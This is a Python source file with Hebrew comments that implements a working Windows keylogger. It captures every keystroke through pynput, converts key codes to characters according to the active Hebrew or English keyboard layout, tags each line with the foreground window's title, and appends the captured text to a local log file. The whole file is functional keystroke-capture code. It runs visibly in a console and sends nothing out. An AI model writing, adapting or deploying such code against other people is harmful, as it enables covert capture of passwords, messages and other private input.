from pynput import keyboard
import ctypes
from ctypes import wintypes
import win32con
from win32gui import GetForegroundWindow, GetWindowText

user32 = ctypes.WinDLL('user32', use_last_error=True)

# הגדרות ומבנים מ-Windows API
user32.GetKeyboardLayout.restype = wintypes.HKL
user32.GetWindowThreadProcessId.argtypes = (wintypes.HWND, ctypes.POINTER(wintypes.DWORD))
user32.GetKeyboardLayout.argtypes = (wintypes.DWORD,)
user32.ToUnicodeEx.restype = ctypes.c_int
user32.ToUnicodeEx.argtypes = (
    wintypes.UINT, wintypes.UINT, ctypes.POINTER(wintypes.BYTE),
    ctypes.POINTER(wintypes.WCHAR), ctypes.c_int, wintypes.UINT,
    wintypes.HKL
)


class Keylogger:
    def __init__(self, file_path):
        self.file_path = file_path
        self.text = ""  # מחרוזת לאיסוף ההקלדות
        self.current_window = ""  # שם החלון הפעיל
        self.current_layout = self.get_keyboard_layout()  # פריסת מקלדת נוכחית

    def get_keyboard_layout(self):
        """מחזיר את פריסת המקלדת הנוכחית עבור החלון הפעיל"""
        hwnd = GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        return user32.GetKeyboardLayout(thread_id)

    def get_char(self, vk_code, scan_code):
        """ממיר קוד מקש לתו לפי פריסת המקלדת הנוכחית"""
        buf = ctypes.create_unicode_buffer(8)
        keyboard_state = (wintypes.BYTE * 256)()

        hwnd = GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        layout = user32.GetKeyboardLayout(thread_id)

        user32.ToUnicodeEx(vk_code, scan_code, keyboard_state, buf, 8, 0, layout)
        return buf.value

    def check_language_switch(self):
        """בודק אם בוצעה החלפת שפה ורושם את השינוי"""
        new_layout = self.get_keyboard_layout()
        if new_layout != self.current_layout:
            lang_id = new_layout & 0xFFFF
            lang_name = "Hebrew" if lang_id == 0x040D else "English"
            self.text += f" [Switched to {lang_name}]"
            self.current_layout = new_layout

    def get_active_window(self):
        """מחזיר את שם החלון הפעיל"""
        return GetWindowText(GetForegroundWindow())

    def save_to_file(self):
        """שומר את הטקסט שנאסף לקובץ"""
        if self.text:
            output = f"[{self.current_window}]{self.text}"
            with open(self.file_path, "a", encoding="utf-8") as f:
                f.write(output + "\n")
            print(output)
            self.text = ""

    def on_press(self, key):
        try:
            # בדיקת החלפת שפה לפני עיבוד המקש
            self.check_language_switch()

            # עדכון החלון הפעיל
            new_window = self.get_active_window()
            if new_window != self.current_window:
                self.save_to_file()
                self.current_window = new_window

            # טיפול במקשים מיוחדים
            if key == keyboard.Key.enter:
                self.save_to_file()
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace:
                self.text = self.text[:-1]
            elif key == keyboard.Key.esc:
                self.save_to_file()
                return False  # עצירת הרישום
            elif hasattr(key, 'vk'):
                # המרת קוד המקש לתו
                char = self.get_char(key.vk, 0)
                if char:
                    self.text += char

            print(f"[{self.current_window}]{self.text}", end="\r")

        except Exception as e:
            print(f"שגיאה: {e}")

    def run(self):
        print("⌨️ Keylogger started (Press ESC to stop)...")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    Keylogger("keylog.txt").run()